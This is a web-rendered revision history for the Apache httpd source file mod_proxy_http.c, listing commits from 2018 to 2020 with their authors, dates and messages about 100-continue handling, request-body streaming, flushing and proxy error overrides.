([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1876404))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1876404)

Modified
*Sat Apr 11 21:19:08 2020 UTC*
(4 years, 9 months ago)
by *covener*

File length: 89077 byte(s)

Diff to [previous 1875353](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1875353&r2=1876404)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1875353&r2=1876404&diff_format=h))
```
PR63628: individual status codes for ProxyErrorOverride.

Support specifying the http status codes to be considered by ProxyErrorOverride

Submitted By: Martin Drößler <mail martindroessler.de>
Committed By: covener

```

---

Revision [**1875353**](/viewvc?view=revision&revision=1875353) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1875353&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1875353&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1875353))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1875353)

Modified
*Wed Mar 18 10:53:06 2020 UTC*
(4 years, 10 months ago)
by *rpluem*

File length: 89093 byte(s)

Diff to [previous 1873985](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1873985&r2=1875353)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1873985&r2=1875353&diff_format=h))
```
* modules/proxy/mod_proxy_http.c (ap_proxy_http_process_response): Clear any
  possible returned buckets in the brigade in the error case. As we want to
  close the connection anyway there is no sensible content we could still
  sent and hence doing the needed life time transformation of the buckets
  would be a waste.

PR: 64234

```

---

Revision [**1873985**](/viewvc?view=revision&revision=1873985) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1873985&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1873985&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1873985))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1873985)

Modified
*Thu Feb 13 18:15:57 2020 UTC*
(4 years, 11 months ago)
by *mrumph*

File length: 89044 byte(s)

Diff to [previous 1872673](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1872673&r2=1873985)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1872673&r2=1873985&diff_format=h))
```
Fix spelling errors found by codespell.  [skip ci]

```

---

Revision [**1872673**](/viewvc?view=revision&revision=1872673) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1872673&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1872673&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1872673))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1872673)

Modified
*Sun Jan 12 12:56:12 2020 UTC*
(5 years ago)
by *covener*

File length: 89043 byte(s)

Diff to [previous 1869224](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1869224&r2=1872673)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1869224&r2=1872673&diff_format=h))
```
proxy: add local address to body-forwarding errors

Adds the local/ephemeral port for the backend connection

```

---

Revision [**1869224**](/viewvc?view=revision&revision=1869224) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1869224&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1869224&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1869224))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1869224)

Modified
*Thu Oct 31 16:16:05 2019 UTC*
(5 years, 2 months ago)
by *ylavic*

File length: 88928 byte(s)

Diff to [previous 1869223](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1869223&r2=1869224)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1869223&r2=1869224&diff_format=h))
```
mod_proxy_http: follow up to [r1869216](/viewvc?view=revision&revision=1869216).

Let's call stream_reqbody() for all rb_methods, no RB_SPOOL_CL special case.

This both simplifies code and allows to keep EOS into the input_brigade until
it's sent, and thus detect whether we already fetched the whole body if/when
proxy_http_handler() re-enters for different balancer members.

```

---

Revision [**1869223**](/viewvc?view=revision&revision=1869223) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1869223&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1869223&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1869223))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1869223)

Modified
*Thu Oct 31 16:10:08 2019 UTC*
(5 years, 2 months ago)
by *ylavic*

File length: 89954 byte(s)

Diff to [previous 1869222](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1869222&r2=1869223)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1869222&r2=1869223&diff_format=h))
```
Revert [r1869222](/viewvc?view=revision&revision=1869222), wrong files committed.

```

---

Revision [**1869222**](/viewvc?view=revision&revision=1869222) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1869222&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1869222&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1869222))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1869222)

Modified
*Thu Oct 31 16:08:33 2019 UTC*
(5 years, 2 months ago)
by *ylavic*

File length: 88928 byte(s)

Diff to [previous 1869216](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1869216&r2=1869222)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1869216&r2=1869222&diff_format=h))
```
mod_proxy_http: follow up to [r1869216](/viewvc?view=revision&revision=1869216).

Let's call stream_reqbody() for all rb_methods, no RB_SPOOL_CL special case.

This both simplifies code and allows to keep EOS into the input_brigade until
it's sent, and thus detect whether we already fetched the whole body if/when
proxy_http_handler() re-enters for different balancer members.

[reverted by [r1869223](/viewvc?view=revision&revision=1869223)]

```

---

Revision [**1869216**](/viewvc?view=revision&revision=1869216) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1869216&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1869216&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1869216))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1869216)

Modified
*Thu Oct 31 14:15:07 2019 UTC*
(5 years, 2 months ago)
by *ylavic*

File length: 89954 byte(s)

Diff to [previous 1868653](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1868653&r2=1869216)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1868653&r2=1869216&diff_format=h))
```
mod_proxy_http: fix load-balancer fallback for requests with a body.

Since [r1656259](/viewvc?view=revision&revision=1656259) (or [r1656259](/viewvc?view=revision&revision=1656259) in 2.4.41) and the move of prefetch before connect,
the balancer fallback case where proxy_http_handler() is re-entered with the
next balancer member broke.

We need to save the body (partially) prefetched the first time and reuse it on
successive calls, otherwise we might forward partial or empty body.

```

---

Revision [**1868653**](/viewvc?view=revision&revision=1868653) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1868653&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1868653&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1868653))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1868653)

Modified
*Sun Oct 20 13:06:29 2019 UTC*
(5 years, 3 months ago)
by *ylavic*

File length: 88588 byte(s)

Diff to [previous 1868652](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1868652&r2=1868653)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1868652&r2=1868653&diff_format=h))
```
mod_proxy_http: follow up to [r1868576](/viewvc?view=revision&revision=1868576).

Omit sending 100 continue if the body is (partly) prefetched, per
RFC 7231 (section 5.1.1).

```

---

Revision [**1868652**](/viewvc?view=revision&revision=1868652) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1868652&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1868652&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1868652))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1868652)

Modified
*Sun Oct 20 12:31:45 2019 UTC*
(5 years, 3 months ago)
by *ylavic*

File length: 87999 byte(s)

Diff to [previous 1868625](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1868625&r2=1868652)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1868625&r2=1868652&diff_format=h))
```
mod_proxy_http: revert [r1868625](/viewvc?view=revision&revision=1868625).

The HTTP_IN filter handles "100 Continue" the first time it's called only,
and in spool_reqbody_cl() we have already tried to prefetch the body, so
it's too late.

```

---

Revision [**1868625**](/viewvc?view=revision&revision=1868625) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1868625&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1868625&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1868625))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1868625)

Modified
*Sat Oct 19 13:58:16 2019 UTC*
(5 years, 3 months ago)
by *ylavic*

File length: 88161 byte(s)

Diff to [previous 1868576](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1868576&r2=1868625)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1868576&r2=1868625&diff_format=h))
```
mod_proxy_http: follow up to [r1868576](/viewvc?view=revision&revision=1868576).

As suggested by Ruediger, let the HTTP_IN filter handle the 100 continue from
spool_reqbody_cl().

Also, according to rfc7231#section-5.1.1, we don't need the interim response
if we "already received some or all of the message body", which is now also
taken into account.

[Reverted by [r1868652](/viewvc?view=revision&revision=1868652)]

```

---

Revision [**1868576**](/viewvc?view=revision&revision=1868576) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1868576&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1868576&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1868576))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1868576)

Modified
*Fri Oct 18 07:50:59 2019 UTC*
(5 years, 3 months ago)
by *ylavic*

File length: 87999 byte(s)

Diff to [previous 1859371](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1859371&r2=1868576)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1859371&r2=1868576&diff_format=h))
```
mod_proxy_http: Fix 100-continue deadlock for spooled request bodies. PR 63855.

Send "100 Continue", if needed, before fetching/blocking on the request body in
spool_reqbody_cl(), otherwise mod_proxy and the client can wait for each other,
leading to a request timeout (408).

While at it, make so that ap_send_interim_response() uses the default status
line if none is set in r->status_line.

```

---

Revision [**1859371**](/viewvc?view=revision&revision=1859371) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1859371&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1859371&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1859371))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1859371)

Modified
*Thu May 16 12:52:29 2019 UTC*
(5 years, 8 months ago)
by *rjung*

File length: 87569 byte(s)

Diff to [previous 1856036](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1856036&r2=1859371)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1856036&r2=1859371&diff_format=h))
```
mod_proxy/ssl: Proxy SSL client certificate
configuration and other proxy SSL configurations
broken inside <Proxy> context.
PR 63430
Triggered by [r1855646](/viewvc?view=revision&revision=1855646)+[r1855748](/viewvc?view=revision&revision=1855748).
Patch from rpluem (proxy) and ylavic (ssl).

```

---

Revision [**1856036**](/viewvc?view=revision&revision=1856036) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1856036&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1856036&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1856036))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1856036)

Modified
*Fri Mar 22 09:53:29 2019 UTC*
(5 years, 10 months ago)
by *ylavic*

File length: 87666 byte(s)

Diff to [previous 1853956](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1853956&r2=1856036)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1853956&r2=1856036&diff_format=h))
```
mod_proxy: follow up to [r1836588](/viewvc?view=revision&revision=1836588): configurable Proxy100Continue.

Add Proxy100Continue directive to allow for 100-continue forwarding opt-out.

```

---

Revision [**1853956**](/viewvc?view=revision&revision=1853956) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1853956&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1853956&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1853956))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1853956)

Modified
*Wed Feb 20 12:53:06 2019 UTC*
(5 years, 11 months ago)
by *ylavic*

File length: 87525 byte(s)

Diff to [previous 1853953](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1853953&r2=1853956)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1853953&r2=1853956&diff_format=h))
```
mod_proxy_http: revert spurious comment from [r1853953](/viewvc?view=revision&revision=1853953).

No, if we read more bytes than the C-L there is really something wrong in
our (or some) HTTP input filter.

```

---

Revision [**1853953**](/viewvc?view=revision&revision=1853953) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1853953&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1853953&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1853953))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1853953)

Modified
*Wed Feb 20 12:24:14 2019 UTC*
(5 years, 11 months ago)
by *ylavic*

File length: 87598 byte(s)

Diff to [previous 1853566](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1853566&r2=1853953)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1853566&r2=1853953&diff_format=h))
```
mod_proxy_http: common function for stream_reqbody_{cl,chunked}()

Since stream_reqbody_cl() and stream_reqbody_chunked}() now have the same
structure, join them into a single stream_reqbody() function which is passed
the rb_method to handle only CL vs chunked cases differently.

```

---

Revision [**1853566**](/viewvc?view=revision&revision=1853566) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1853566&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1853566&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1853566))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1853566)

Modified
*Thu Feb 14 08:45:36 2019 UTC*
(5 years, 11 months ago)
by *ylavic*

File length: 89404 byte(s)

Diff to [previous 1853565](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1853565&r2=1853566)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1853565&r2=1853566&diff_format=h))
```
mod_proxy_http: follow up to [r1853561](/viewvc?view=revision&revision=1853561).

Handle "proxy-sendextracrlf" within the loop too.

Btw, this extra CRLF heresy should go (at least in trunk)

```

---

Revision [**1853565**](/viewvc?view=revision&revision=1853565) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1853565&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1853565&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1853565))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1853565)

Modified
*Thu Feb 14 08:40:38 2019 UTC*
(5 years, 11 months ago)
by *ylavic*

File length: 89532 byte(s)

Diff to [previous 1853564](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1853564&r2=1853565)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1853564&r2=1853565&diff_format=h))
```
Revert [r1853564](/viewvc?view=revision&revision=1853564).

```

---

Revision [**1853564**](/viewvc?view=revision&revision=1853564) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1853564&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1853564&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1853564))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1853564)

Modified
*Thu Feb 14 08:34:05 2019 UTC*
(5 years, 11 months ago)
by *ylavic*

File length: 89604 byte(s)

Diff to [previous 1853561](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1853561&r2=1853564)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1853561&r2=1853564&diff_format=h))
```
mod_proxy_http: follow up to [r1853409](/viewvc?view=revision&revision=1853409): no need to double flush on EOS.

[Reverted by [r1853565](/viewvc?view=revision&revision=1853565)]

```

---

Revision [**1853561**](/viewvc?view=revision&revision=1853561) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1853561&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1853561&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1853561))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1853561)

Modified
*Thu Feb 14 08:22:49 2019 UTC*
(5 years, 11 months ago)
by *ylavic*

File length: 89532 byte(s)

Diff to [previous 1853518](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1853518&r2=1853561)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1853518&r2=1853561&diff_format=h))
```
mod_proxy_http: follow up to [r1853409](/viewvc?view=revision&revision=1853409): don't play with meta-buckets.

It's better/simpler to handle the final 0-size chunk within the loop (on EOS).

```

---

Revision [**1853518**](/viewvc?view=revision&revision=1853518) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1853518&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1853518&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1853518))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1853518)

Modified
*Wed Feb 13 16:53:50 2019 UTC*
(5 years, 11 months ago)
by *ylavic*

File length: 89766 byte(s)

Diff to [previous 1853407](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1853407&r2=1853518)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1853407&r2=1853518&diff_format=h))
```
mod_proxy_http: follow up to [r1853409](/viewvc?view=revision&revision=1853409).

Don't send two final 0-size chunks when the last read brigade is a single EOS.

```

---

Revision [**1853407**](/viewvc?view=revision&revision=1853407) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1853407&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1853407&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1853407))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1853407)

Modified
*Mon Feb 11 21:55:43 2019 UTC*
(5 years, 11 months ago)
by *ylavic*

File length: 89244 byte(s)

Diff to [previous 1837056](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1837056&r2=1853407)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1837056&r2=1853407&diff_format=h))
```
mod_proxy_http: rework the flushing strategy when forwarding the request body.

Since the forwarding of 100-continue (end to end) in [r1836588](/viewvc?view=revision&revision=1836588), we depended on
reading all of the requested HUGE_STRING_LEN bytes to avoid the flushes, but
this is a bit fragile.

This commit introduces the new stream_reqbody_read() function which will try a
nonblocking read first and, if it fails with EAGAIN, will flush on the backend
side before blocking for the next client side read.

We can then use it in stream_reqbody_{chunked,cl}() to flush client forwarded
data only when necessary. This both allows "optimal" flushing and simplifies
code (note that spool_reqbody_cl() also makes use of the new function but not
its nonblocking/flush functionality, thus only for consistency with the two
others, simplification and common error handling).

Also, since proxy_http_req_t::flushall/subprocess_env::proxy-flushall are now
meaningless (and unused) on the backend side, they are renamed respectively to
prefetch_nonblocking/proxy-prefetch-nonblocking, and solely determine whether
to prefetch in nonblocking mode or not. These flags were trunk only and may
not be really useful if we decided to prefetch in nonblocking mode in any case,
but for 2.4.x the opt-in looks wise.

```

---

Revision [**1837056**](/viewvc?view=revision&revision=1837056) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1837056&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1837056&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1837056))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1837056)

Modified
*Mon Jul 30 13:08:23 2018 UTC*
(6 years, 5 months ago)
by *ylavic*

File length: 91492 byte(s)

Diff to [previous 1837040](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1837040&r2=1837056)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1837040&r2=1837056&diff_format=h))
```
http: Enforce consistently no response body with both 204 and 304 statuses.

Provide AP_STATUS_IS_HEADER_ONLY() helper/macro to check for 204 or 304 and
use it where some special treatment is needed when no body is expected.

Some of those places handled 204 only.

```

---

Revision [**1837040**](/viewvc?view=revision&revision=1837040) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1837040&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1837040&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1837040))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1837040)

Modified
*Mon Jul 30 10:14:42 2018 UTC*
(6 years, 5 months ago)
by *ylavic*

File length: 91629 byte(s)

Diff to [previous 1836750](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1836750&r2=1837040)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1836750&r2=1837040&diff_format=h))
```
mod_proxy_http: follow up to [r1836588](/viewvc?view=revision&revision=1836588): nonblocking read for 100-continue body.

Set nonblocking read (req->flushall) when handling 100-continue since no body
is expected to be there already.

```

---

Revision [**1836750**](/viewvc?view=revision&revision=1836750) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1836750&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1836750&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1836750))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1836750)

Modified
*Thu Jul 26 17:51:09 2018 UTC*
(6 years, 6 months ago)
by *ylavic*

File length: 91609 byte(s)

Diff to [previous 1836716](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1836716&r2=1836750)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1836716&r2=1836750&diff_format=h))
```
mod_proxy_http: follow up to [r1836588](/viewvc?view=revision&revision=1836588): fix drop of spurious 100 responses.

[r1836588](/viewvc?view=revision&revision=1836588) broke t/security/CVE-2008-2364.t by forwarding more than one
"100 continue" response, fix it.

```

---

Revision [**1836716**](/viewvc?view=revision&revision=1836716) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1836716&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1836716&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1836716))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1836716)

Modified
*Thu Jul 26 11:29:51 2018 UTC*
(6 years, 6 months ago)
by *ylavic*

File length: 91552 byte(s)

Diff to [previous 1836648](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1836648&r2=1836716)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1836648&r2=1836716&diff_format=h))
```
mod_proxy_http: follow up to [r1836588](/viewvc?view=revision&revision=1836588)/[r1836648](/viewvc?view=revision&revision=1836648): handle unread 100-continue.

When the backend responds with a non-interim response to a 100-continue,
mod_proxy_http won't read the client's body, so make sure "Connection: close"
ends up being added to the response if nobody reads that body later.

The right thing to do at mod_proxy level, rather then forcing AP_CONN_CLOSE,
is to restore r->expecting_100 so that further processing (like error_override
or trying on the next balancer member) can still work.

```

---

Revision [**1836648**](/viewvc?view=revision&revision=1836648) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1836648&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1836648&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1836648))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1836648)

Modified
*Wed Jul 25 16:33:44 2018 UTC*
(6 years, 6 months ago)
by *ylavic*

File length: 90630 byte(s)

Diff to [previous 1836588](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1836588&r2=1836648)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1836588&r2=1836648&diff_format=h))
```
mod_proxy_http: follow up to [r1836588](/viewvc?view=revision&revision=1836588): avoid 100-continue responses from core.

When mod_proxy_http handles end-to-end "100 continue", it can't let
ap_http_filter() send its own interim response whenever the body is read.

So save/restore r->expecting_100 before/after handling the request, and use
req->expecting_100 internally (including to restore r->expecting appropriately).

While at it, add comments and debug logs about 100 continue handling, and
fill in missing APLOGNO()s from [r1836588](/viewvc?view=revision&revision=1836588).

```

---

Revision [**1836588**](/viewvc?view=revision&revision=1836588) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1836588&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1836588&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1836588))
